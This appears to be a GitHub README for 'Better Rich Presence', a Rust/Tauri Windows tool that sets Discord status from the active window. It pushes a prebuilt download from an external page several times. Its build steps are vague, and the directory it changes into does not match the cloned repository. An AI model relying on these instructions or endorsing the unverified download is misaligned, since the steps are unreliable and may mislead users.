# Better Rich Presence v1 - Discord Rich Presence Desktop App 2026

> **Better Rich Presence is a Windows desktop utility that watches the foreground application and updates Discord Rich Presence as activity changes. It also supports custom applications and is built with a compact Rust, React, and Tauri stack.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/evan-taylorsks2821/better-rich-presence-windows?style=flat-square)](https://github.com/evan-taylorsks2821/better-rich-presence-windows)

---

<p align="center">
  <a href="https://evan-taylorsks2821.github.io/better-rich-presence-windows/">
    <img src="https://img.shields.io/badge/Download-Better%20Rich%20Presence%20Latest-brightgreen?style=for-the-badge" alt="Download Better Rich Presence">
  </a>
</p>

> **[Download Better Rich Presence v1](https://evan-taylorsks2821.github.io/better-rich-presence-windows/)**

---

[Download Latest Build](https://evan-taylorsks2821.github.io/better-rich-presence-windows/)

---

## What Is Better Rich Presence?

Better Rich Presence keeps your Discord activity synchronized with the Windows application you are currently using. It observes the active window and updates your Discord status when you switch among games and other important programs.

The desktop application pairs a Rust and Tauri backend layer with a React and TailwindCSS interface. It aims to provide an uncomplicated setup while offering custom application entries, priority controls, idle detection, and smoother status changes.

---

## Highlights

- Identifies the active Windows application automatically.
- Refreshes Discord Rich Presence in real time.
- Lets users define custom applications.
- Works from the start without requiring initial configuration.
- Applies priority rules to games and other selected important programs.
- Uses anti-flicker transitions to avoid excessive status switching.
- Detects idle periods.
- Keeps CPU and memory consumption low.
- Includes a modern interface made with React and TailwindCSS.

---

## Getting Started

### Download the Application

1. Visit the [latest build download page](https://evan-taylorsks2821.github.io/better-rich-presence-windows/).
2. Download the Windows release of Better Rich Presence.
3. Install the application or run the downloaded file.
4. Open Discord and use Better Rich Presence from the desktop.

### Compile from Source

```bash
git clone https://github.com/evan-taylorsks2821/better-rich-presence-windows.git
cd Better-Rich-Presence-For-Discord
```

The exact build and launch commands are determined by the included Tauri project configuration. Refer to the repository package scripts and development setup when running the application locally.

---

## Using the App

1. Start Better Rich Presence on Windows.
2. Keep it running while Discord is in use.
3. Move between games and other applications.
4. Allow foreground-window detection to identify the current activity.
5. Create a custom application entry if automatic detection does not find a program.
6. Change application priority when multiple programs require different treatment.
7. Configure idle detection and transition options to influence how activity changes appear.

---

## Settings and Configuration

No configuration file is needed for the initial launch. The desktop interface provides the main controls for:

- Creating and maintaining custom application entries.
- Assigning priority to games and important applications.
- Checking idle detection behavior.
- Changing status transition behavior when those controls are available.

For options that are not shown in the interface, consult the application directory and repository documentation to find the configuration location used by the current build.

---

## System Requirements

- Windows operating system.
- Discord desktop application.
- A Windows environment with active-window detection available.
- Enough storage for the application and its runtime files.
- A Rust, React, and Tauri development environment for source builds.

---

## Frequently Asked Questions

### Is manual configuration needed before starting?

No initial setup is intended to be necessary. Launch the application on Windows and let it identify the active window.

### What if my application is not detected automatically?

You can add it yourself through the custom application support.

### How does the app choose between several applications?

Its priority engine can give preference to games and other important applications when multiple activities must be evaluated.

### Are Discord updates made in real time?

Yes. Better Rich Presence is designed to update Discord Rich Presence as the active window changes.

### Does the app recognize inactivity?

Idle detection helps identify periods when the computer is not being actively used.

### What should I check if no status appears?

Make sure Discord is running, Better Rich Presence is open, and the desired program is the active window. If you added a custom entry, verify its application configuration in the interface.

### Where are new builds published?

Check the [latest build page](https://evan-taylorsks2821.github.io/better-rich-presence-windows/) for the current release.

---

## Future Work

- Improve active-window recognition for additional application types.
- Further refine priority handling and transition behavior.
- Add more controls for configuring custom applications.
- Preserve the Windows desktop experience and resource-conscious approach.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
